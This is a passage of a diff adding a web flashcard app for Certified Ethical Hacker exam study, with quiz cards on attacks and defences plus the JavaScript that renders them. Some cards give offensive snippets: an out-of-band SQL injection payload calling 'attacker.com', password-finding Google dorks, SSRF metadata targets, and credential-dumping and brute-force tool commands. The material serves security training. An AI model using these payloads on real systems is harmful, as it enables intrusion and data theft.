+  {id:167,cat:"Web Apps",diff:"H",q:"What is the OWASP Top 10 A08:2021 and give a real-world example?",a:"Software and Data Integrity Failures — untrusted update pipelines, insecure deserialisation, lack of code signing. Real-world example: SolarWinds supply chain attack — malicious code injected into trusted software updates. Also: npm package hijacking, CI/CD pipeline compromise."},
+  {id:168,cat:"Cryptography",diff:"H",q:"What is a man-in-the-middle attack against TLS and what prevents it?",a:"Attacker presents their own cert to client, client's cert to server — reads/modifies all traffic. Prevention: Certificate Pinning (app refuses unknown certs), HSTS (forces HTTPS, prevents downgrade), Certificate Transparency (public log detects rogue certs), DANE (DNSSEC-based cert validation)."},
+  {id:169,cat:"Pentest",diff:"H",q:"What is the OWASP Testing Guide (OTG) used for?",a:"Comprehensive web application testing methodology — standardised test cases for each OWASP Top 10 category and beyond: information gathering, authentication testing, session management, input validation, cryptography, error handling. Ensures thorough, repeatable, and documented testing."},
+  {id:170,cat:"Scenario",diff:"H",q:"A pentest scope authorises internal network testing but not the domain controller. The tester obtains Domain Admin. What should they do?",a:"Stop immediately — Domain Controller is explicitly out of scope. Document current state with evidence. Contact the emergency contact defined in RoE immediately. Await client instructions before any further action. Do not exploit further. All activity beyond scope is unauthorised."},
+  {id:171,cat:"Foundations",diff:"M",q:"What is threat modelling and what framework does CEH v12 introduce?",a:"Identifying potential threats before exploitation. CEH v12 introduces the Diamond Model of Intrusion Analysis (Adversary, Capability, Infrastructure, Victim). Also covers STRIDE: Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege."},
+  {id:172,cat:"SQLi",diff:"H",q:"What is Out-of-Band SQL injection?",a:"Exfiltrates data via a different channel than the HTTP response (DNS queries, HTTP callbacks). Used when in-band methods are blocked. MySQL: LOAD_FILE() with UNC paths for DNS exfil. MSSQL: xp_dirtree('\\\\attacker.com\\share'). Requires specific server permissions and outbound access."},
+  {id:173,cat:"Wireless",diff:"M",q:"What is wardriving and what tool is commonly used?",a:"Driving around with a wireless adapter in monitor mode to discover and map Wi-Fi access points — SSIDs, BSSIDs, channels, signal strength, encryption type. Tool: Kismet (passive, logs everything), inSSIDer (Windows, visual analysis). Used to identify attack targets and rogue APs."},
+  {id:174,cat:"Cloud",diff:"M",q:"What is a CASB (Cloud Access Security Broker) and what does it provide?",a:"Security policy enforcement point between cloud users and cloud services. Provides: shadow IT visibility (unauthorised cloud app use), DLP (prevent data exfiltration), threat protection, compliance monitoring, and access control enforcement for cloud apps like O365, Salesforce."},
+  {id:175,cat:"System Hacking",diff:"H",q:"What is DLL injection and when is it used?",a:"Injecting a malicious DLL into a running process to execute code in that process's context and privilege level. Used for: privilege escalation (inject into high-privilege process), persistence (inject into always-running process), AV evasion (code runs inside trusted process). Uses CreateRemoteThread/LoadLibrary."},
+  {id:176,cat:"Malware",diff:"M",q:"What is a keylogger and what are its two main types?",a:"Software that records keystrokes to capture passwords, messages, and other sensitive input. Software keylogger: runs as a process (easier to deploy, detectable by AV). Hardware keylogger: physical device between keyboard and computer (undetectable by AV, requires physical access)."},
+  {id:177,cat:"Web Apps",diff:"M",q:"What is the difference between SQL injection auth bypass and brute force?",a:"SQLi bypass: exploits query logic flaw — works regardless of password complexity, no lockout. Brute force: tries actual passwords — blocked by lockout, CAPTCHA, rate limiting. SQLi is instantaneous and always works on vulnerable systems; brute force is slow and detectable."},
+  {id:178,cat:"IDS/Firewall",diff:"H",q:"What is a TTL manipulation attack against an IDS?",a:"Sending a decoy packet with TTL just high enough to reach the IDS but expire before the target. IDS processes the decoy and updates its state. Real malicious packet follows with sufficient TTL to reach target. IDS state diverges from target's view — attack goes undetected."},
+  {id:179,cat:"Enumeration",diff:"M",q:"What is RPC enumeration and what does it reveal?",a:"Identifying services registered with portmapper (port 111). Tool: rpcinfo -p [target]. Reveals: NFS (mountd, nlockmgr), NIS (ypserv), and other RPC services. NFS shares found via rpcinfo can be mounted without authentication if misconfigured."},
+  {id:180,cat:"Scanning",diff:"M",q:"What Nmap NSE script checks for EternalBlue (MS17-010/WannaCry)?",a:"nmap --script smb-vuln-ms17-010 [target]. Returns 'VULNERABLE' if the system is unpatched. Also useful: smb-vuln-ms08-067 (Conficker), smb-vuln-cve2009-3103. Always run vuln scripts with explicit permission — they probe actual vulnerabilities."},
+  {id:181,cat:"Web Servers",diff:"M",q:"Why should Server and X-Powered-By HTTP response headers be removed?",a:"They reveal exact web server type, version, and technology stack (e.g., Server: Apache/2.4.49, X-Powered-By: PHP/7.4.3). Enables targeted exploitation of specific CVEs. Fix: ServerTokens Prod (Apache), removeServerHeader (Nginx), custom filter (IIS). Principle of least information."},
+  {id:182,cat:"Sniffing",diff:"E",q:"Which protocols are vulnerable to sniffing and which are protected?",a:"Vulnerable (cleartext): HTTP (80), FTP (21), Telnet (23), SMTP (25), POP3 (110), IMAP (143), SNMP v1/v2 (161). Protected (encrypted): HTTPS (443), SFTP/SSH (22), SMTPS (465/587), IMAPS (993), POP3S (995), SNMPv3."},
+  {id:183,cat:"Cryptography",diff:"E",q:"What is MD5 hash length vs SHA-256 and which is broken?",a:"MD5: 128-bit (32 hex characters) — BROKEN (collision attacks proven, GPU-crackable). SHA-1: 160-bit — BROKEN (Google SHAttered collision 2017). SHA-256: 256-bit — current standard, computationally secure. Never use MD5 or SHA-1 for security purposes."},
+  {id:184,cat:"Wireless",diff:"M",q:"What is the difference between WPA-Personal and WPA-Enterprise authentication?",a:"WPA-Personal (PSK): single shared passphrase for all users. Simple but single compromise exposes all. WPA-Enterprise: 802.1X with RADIUS server — each user has unique credentials (username/password or certificate). Compromise of one user doesn't affect others."},
+  {id:185,cat:"Session Hijack",diff:"M",q:"What is a man-in-the-browser (MitB) attack?",a:"Malware (usually Trojan) infects browser via extension/BHO and intercepts/modifies transactions in real-time — after authentication, before display. Victim sees legitimate transaction; attacker modifies amount/recipient. Bypasses 2FA because manipulation happens inside authenticated session."},
+  {id:186,cat:"IoT / OT",diff:"M",q:"What is the Zigbee security weakness?",a:"Zigbee uses AES-128 for encryption, but devices can be forced to use the default link key ('ZigBeeAlliance09') during network joining. Attacker in range during join phase captures the key exchange. Also: replay attacks possible if devices don't validate sequence numbers."},
+  {id:187,cat:"Cloud",diff:"M",q:"What is ScoutSuite and what does it audit?",a:"Open-source multi-cloud security auditing tool (AWS, Azure, GCP, Oracle Cloud). Generates HTML report of misconfigurations: open security groups, public S3 buckets, overprivileged IAM roles, unencrypted storage, disabled logging, and MFA gaps. Essential for cloud security assessment."},
+  {id:188,cat:"Pentest",diff:"M",q:"What is the difference between pentest scope and Rules of Engagement?",a:"Scope defines WHAT is tested: IP ranges, applications, physical premises, social engineering (in-scope / out-of-scope list). RoE defines HOW testing is conducted: timing windows, notification procedures, escalation process, emergency contacts, permitted techniques. Both required before testing."},
+  {id:189,cat:"Scenario",diff:"M",q:"A login page returns different response times for valid vs invalid usernames. What vulnerability?",a:"Timing-based username enumeration — even without different error messages, response time difference reveals whether a username exists (password hash computation takes longer for valid users). Fix: constant-time comparison for all login attempts, identical delays regardless of validity."},
+  {id:190,cat:"Scenario",diff:"H",q:"An attacker finds a parameter: ?url=http://internal-server/admin. What attack should be tested?",a:"SSRF (Server-Side Request Forgery) — server fetches the URL on behalf of user. Test: inject internal IPs (10.0.0.1-254), localhost (127.0.0.1), cloud metadata (169.254.169.254), and internal hostnames. Can access internal services, cloud metadata, and bypass firewall rules."},
+  {id:191,cat:"Tools",diff:"H",q:"What is Impacket and what tools does it include?",a:"Python library for working with Windows network protocols. Key tools: psexec.py (remote execution via SMB), wmiexec.py (WMI-based execution), secretsdump.py (dump credentials remotely), GetUserSPNs.py (Kerberoasting), ntlmrelayx.py (NTLM relay attacks). Essential for Windows post-exploitation."},
+  {id:192,cat:"Compliance",diff:"M",q:"What is HIPAA and what does the Security Rule require?",a:"US Health Insurance Portability and Accountability Act — protects electronic Protected Health Information (ePHI). Security Rule requires: Administrative (policies, training, risk analysis), Physical (facility access, workstation controls), and Technical safeguards (encryption, audit logs, access controls). Breach notification: 60 days."},
+  {id:193,cat:"Web Apps",diff:"H",q:"What is insecure deserialisation and what can it lead to?",a:"Deserialising untrusted data without validation — attacker provides malicious serialised objects that execute code when deserialised. Can lead to: Remote Code Execution, privilege escalation, DoS, authentication bypass. Affects Java (ysoserial), PHP (unserialize()), Python (pickle). OWASP A08."},
+  {id:194,cat:"Scanning",diff:"H",q:"What does nmap -sA do and what does it reveal?",a:"ACK scan — sends ACK packets to probe firewall rules. 'Unfiltered' (RST received) = port is reachable but state unknown. 'Filtered' (no response/ICMP) = firewall blocking. Used to map firewall rules and distinguish stateful from stateless firewalls, not to find open ports."},
+  {id:195,cat:"Social Eng.",diff:"H",q:"What is vishing and what social engineering principles does it exploit?",a:"Voice phishing — phone calls impersonating IT support, bank fraud teams, or authorities. Exploits: Authority (I'm from IT/FBI), Urgency (act now or lose account), Fear (your account is compromised), Helpfulness (natural desire to assist). Hard to verify caller identity over phone."},
+  {id:196,cat:"Footprinting",diff:"M",q:"What is Google dorking/hacking and give three useful dorks?",a:"Using advanced Google operators to find sensitive exposed information. Examples: site:target.com filetype:pdf (exposed PDFs), intitle:'index of' site:target.com (directory listings), inurl:admin site:target.com (admin panels), site:target.com ext:sql (exposed databases), 'password' filetype:xls site:target.com."},
+  {id:197,cat:"System Hacking",diff:"M",q:"What is steganography and how does it differ from cryptography?",a:"Steganography hides the EXISTENCE of a message inside another file (image, audio, video) — security through obscurity. Cryptography scrambles the CONTENT — existence visible but unreadable. Steganalysis detects hidden data. Both can be combined: encrypt then steganographically embed."},
+  {id:198,cat:"Malware",diff:"H",q:"What is a RAT and how does it differ from a simple backdoor?",a:"RAT (Remote Access Trojan): full remote control — file browser, webcam, keylogger, microphone, shell, screenshot. Feature-rich attacker toolkit. Simple backdoor: basic persistent entry point (listening port or scheduled task) for re-entry. RATs include backdoor functionality but are far more capable."},
+  {id:199,cat:"Cloud",diff:"H",q:"What is serverless function (Lambda) security risk?",a:"Serverless functions inherit over-privileged IAM execution roles (most common risk), process untrusted event data (event injection), and have exposed environment variables (API keys, DB passwords). Attack: inject malicious data into event source (SQS, S3, API Gateway) to trigger RCE or data exfil."},
+  {id:200,cat:"Scenario",diff:"H",q:"An attacker found nmap -sV reports OpenSSH 7.2p2 on port 22. What should they check next?",a:"CVE-2016-6210 (user enumeration via timing attack), CVE-2016-10010 (privilege escalation), and check if PermitRootLogin is enabled. Also: try default/weak credentials, check for keyboard-interactive auth bypass. Run: nmap --script ssh-auth-methods and ssh-brute for automated checks."}
+];
+
+// ── STATE ─────────────────────────────────────────────────────────────────
+let state = {
+  idx: 0,
+  flipped: false,
+  selCat: "All",
+  selDiff: "All",
+  onlyReview: false,
+  known: new Set(),
+  review: new Set(),
+};
+
+function getFiltered() {
+  return CARDS.filter(c => {
+    const catOk = state.selCat === "All" || c.cat === state.selCat;
+    const diffOk = state.selDiff === "All" || c.diff === state.selDiff;
+    const revOk = !state.onlyReview || state.review.has(c.id);
+    return catOk && diffOk && revOk;
+  });
+}
+
+// ── RENDER ────────────────────────────────────────────────────────────────
+function render() {
+  const filtered = getFiltered();
+  const safeIdx = Math.min(state.idx, Math.max(0, filtered.length - 1));
+  state.idx = safeIdx;
+  const card = filtered[safeIdx];
+
+  if (!card) {
+    document.getElementById('question-text').textContent = 'No cards match current filters.';
+    document.getElementById('answer-text').textContent = 'Try resetting your filters.';
+    document.getElementById('card-counter').textContent = '0 / 0';
+    document.getElementById('card-tags').innerHTML = '';
+    return;
+  }
+
+  const catColor = CAT_COLORS[card.cat] || "#60a5fa";
+  const diffColor = DIFF_COLORS[card.diff] || "#94a3b8";
+
+  // Card content
+  document.getElementById('question-text').textContent = card.q;
+  document.getElementById('answer-text').textContent = card.a;
+  document.getElementById('front-label').textContent = `QUESTION #${card.id}`;
+  document.getElementById('front-dot').style.cssText = `background:${catColor};box-shadow:0 0 10px ${catColor}`;
+
+  // Card border colour
+  document.getElementById('face-front').style.border = `1px solid ${catColor}33`;
+  document.getElementById('face-front').style.boxShadow = `0 0 60px ${catColor}0a, 0 2px 40px rgba(0,0,0,0.5)`;
+
+  // Counter
+  document.getElementById('card-counter').textContent = `${safeIdx + 1} / ${filtered.length}`;
+
+  // Tags
+  const tagsEl = document.getElementById('card-tags');
+  let tagsHtml = `<span class="tag" style="color:${catColor};background:${catColor}15;border-color:${catColor}33">${card.cat}</span>`;
+  tagsHtml += `<span class="tag" style="color:${diffColor};background:${diffColor}15;border-color:${diffColor}33">${DIFF_LABELS[card.diff]}</span>`;
+  if (state.known.has(card.id)) tagsHtml += `<span class="tag" style="color:#4ade80;background:#4ade8011;border-color:#4ade8030">✓ known</span>`;
+  if (state.review.has(card.id)) tagsHtml += `<span class="tag" style="color:#fbbf24;background:#fbbf2411;border-color:#fbbf2430">⚑ review</span>`;
+  tagsEl.innerHTML = tagsHtml;
+
+  // Flip state
+  const flipInner = document.getElementById('flip-inner');
+  flipInner.classList.toggle('flipped', state.flipped);
+
+  // Stats
+  document.getElementById('known-count').textContent = state.known.size;
+  document.getElementById('review-count').textContent = state.review.size;
+
+  // Progress
+  const knownInFilter = filtered.filter(c => state.known.has(c.id)).length;
+  const pct = filtered.length > 0 ? Math.round((knownInFilter / filtered.length) * 100) : 0;
+  document.getElementById('progress-bar').style.width = pct + '%';
+  document.getElementById('progress-pct').textContent = pct + '%';
+
+  // Diff pills
+  document.querySelectorAll('[data-diff]').forEach(btn => {
+    const d = btn.dataset.diff;
+    const col = d === 'All' ? '#38bdf8' : DIFF_COLORS[d];
+    const active = state.selDiff === d;
+    btn.style.cssText = `padding:3px 12px;border-radius:20px;font-size:11px;cursor:pointer;font-family:'Syne Mono',monospace;letter-spacing:.5px;border:1px solid ${active ? col+'66' : '#1e293b'};background:${active ? col+'22' : 'transparent'};color:${active ? col : '#334155'};transition:all .12s`;
+  });
+
+  // Cat pills
+  document.querySelectorAll('[data-cat]').forEach(btn => {
+    const cat = btn.dataset.cat;
+    const col = cat === 'All' ? '#38bdf8' : (CAT_COLORS[cat] || '#94a3b8');
+    const active = state.selCat === cat;
+    btn.style.cssText = `padding:3px 10px;border-radius:20px;font-size:10px;cursor:pointer;font-family:'Syne Mono',monospace;white-space:nowrap;border:1px solid ${active ? col+'55' : '#0f172a'};background:${active ? col+'22' : 'transparent'};color:${active ? col : '#475569'};transition:all .12s`;
+  });
+
+  // Review mode btn
+  const rvBtn = document.getElementById('btn-reviewmode');
+  rvBtn.classList.toggle('active', state.onlyReview);
+
+  // Cat grid
+  renderCatGrid();
+}
+
+function renderCatGrid() {
+  const grid = document.getElementById('cat-grid');
+  const cats = [...new Set(CARDS.map(c => c.cat))];
+  grid.innerHTML = cats.map(cat => {
+    const catCards = CARDS.filter(c => c.cat === cat);
+    const catKnown = catCards.filter(c => state.known.has(c.id)).length;
+    const pct = catCards.length > 0 ? Math.round((catKnown / catCards.length) * 100) : 0;
+    const col = CAT_COLORS[cat] || '#94a3b8';
+    return `<div class="cat-cell" data-gridcat="${cat}" style="border-color:${col}15" onclick="selectCat('${cat}')">
+      <div class="cat-cell-top">
+        <span class="cat-cell-name" style="color:${col}">${cat}</span>
+        <span class="cat-cell-count">${catKnown}/${catCards.length}</span>
+      </div>
+      <div class="cat-cell-bar-bg">
+        <div class="cat-cell-bar" style="width:${pct}%;background:${col}"></div>
+      </div>
+    </div>`;
+  }).join('');
+}
+
+function selectCat(cat) {
+  state.selCat = cat; state.idx = 0; state.flipped = false;
+  render();
+}
+
+function go(dir) {
+  const filtered = getFiltered();
+  const flipWrap = document.getElementById('flip-wrap');
+  state.flipped = false;
+  flipWrap.classList.remove('slide-l','slide-r');
+  setTimeout(() => {
+    let next = state.idx + dir;
+    if (next < 0) next = filtered.length - 1;
+    if (next >= filtered.length) next = 0;
+    state.idx = next;
+    flipWrap.classList.add(dir > 0 ? 'slide-l' : 'slide-r');
+    render();
+    setTimeout(() => flipWrap.classList.remove('slide-l','slide-r'), 220);
+  }, 50);
+}
+
+// ── BUILD PILLS ───────────────────────────────────────────────────────────
+function buildPills() {
+  const catRow = document.getElementById('cat-pills');
+  const cats = ["All", ...new Set(CARDS.map(c => c.cat))];
+  catRow.innerHTML = '<span class="filter-label">CATEGORY:</span>' + cats.map(cat => {
+    const count = cat === 'All' ? CARDS.length : CARDS.filter(c => c.cat === cat).length;
+    return `<button class="pill" data-cat="${cat}" onclick="setCat('${cat}')">${cat} <span style="opacity:.45">${count}</span></button>`;
+  }).join('');
+}
+
+function setCat(cat) { state.selCat = cat; state.idx = 0; state.flipped = false; render(); }
+
+// ── EVENTS ────────────────────────────────────────────────────────────────
+document.getElementById('flip-wrap').addEventListener('click', () => {
+  state.flipped = !state.flipped;
+  render();
+});
+document.getElementById('btn-prev').addEventListener('click', (e) => { e.stopPropagation(); go(-1); });
+document.getElementById('btn-next').addEventListener('click', (e) => { e.stopPropagation(); go(1); });
+document.getElementById('btn-mark-known').addEventListener('click', (e) => {
+  e.stopPropagation();
+  const filtered = getFiltered();
+  const card = filtered[state.idx];
+  if (!card) return;
+  state.known.add(card.id); state.review.delete(card.id);
+  go(1);
+});
+document.getElementById('btn-mark-review').addEventListener('click', (e) => {
+  e.stopPropagation();
+  const filtered = getFiltered();
+  const card = filtered[state.idx];
+  if (!card) return;
+  state.review.add(card.id); state.known.delete(card.id);
+  go(1);
+});
+document.getElementById('btn-reset').addEventListener('click', () => {
+  state.known = new Set(); state.review = new Set(); state.idx = 0; state.flipped = false;
+  render();
+});
+document.getElementById('btn-reviewmode').addEventListener('click', () => {
+  state.onlyReview = !state.onlyReview; state.idx = 0; state.flipped = false;
+  render();
+});
+document.getElementById('btn-random').addEventListener('click', (e) => {
+  e.stopPropagation();
+  const filtered = getFiltered();
+  state.idx = Math.floor(Math.random() * filtered.length);
+  state.flipped = false;
+  render();
+});
+document.querySelectorAll('[data-diff]').forEach(btn => {
+  btn.addEventListener('click', () => {
+    state.selDiff = btn.dataset.diff; state.idx = 0; state.flipped = false;
+    render();
+  });
+});
+
+// Keyboard navigation
+document.addEventListener('keydown', (e) => {
+  if (e.key === 'ArrowRight' || e.key === 'l') go(1);
+  if (e.key === 'ArrowLeft' || e.key === 'h') go(-1);
+  if (e.key === ' ' || e.key === 'Enter') { e.preventDefault(); state.flipped = !state.flipped; render(); }
+  if (e.key === 'g') { state.known.add(getFiltered()[state.idx]?.id); go(1); }
+  if (e.key === 'r') { state.review.add(getFiltered()[state.idx]?.id); go(1); }
+});
+
+// ── INIT ──────────────────────────────────────────────────────────────────
+buildPills();
+render();
+</script>
+</body>
+</html>
